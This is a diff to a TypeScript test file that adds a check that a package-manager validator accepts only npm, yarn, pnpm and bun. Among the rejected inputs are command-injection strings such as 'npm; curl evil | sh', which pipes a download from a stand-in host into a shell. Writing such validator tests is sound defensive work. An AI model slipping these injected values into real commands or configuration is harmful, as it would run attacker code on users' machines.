@@ -1,6 +1,9 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
-import { detectPackageManager } from "../util/packageManager";
+import {
+  detectPackageManager,
+  isKnownPackageManager,
+} from "../util/packageManager";
 
 function files(...present: string[]): (relativePath: string) => boolean {
   const set = new Set(present);
@@ -68,4 +71,23 @@ test("infers bun usage from a bun lockfile", () => {
   });
   assert.equal(result.detected, "bun");
   assert.equal(result.used, "bun");
+});
+
+test("isKnownPackageManager only allows the executable allowlist", () => {
+  for (const name of ["npm", "yarn", "pnpm", "bun"]) {
+    assert.equal(isKnownPackageManager(name), true);
+  }
+  for (const name of [
+    "npm; curl evil | sh",
+    "npm && calc",
+    "npx",
+    "corepack",
+    "",
+  ]) {
+    assert.equal(
+      isKnownPackageManager(name),
+      false,
+      `expected denied: ${name}`,
+    );
+  }
 });
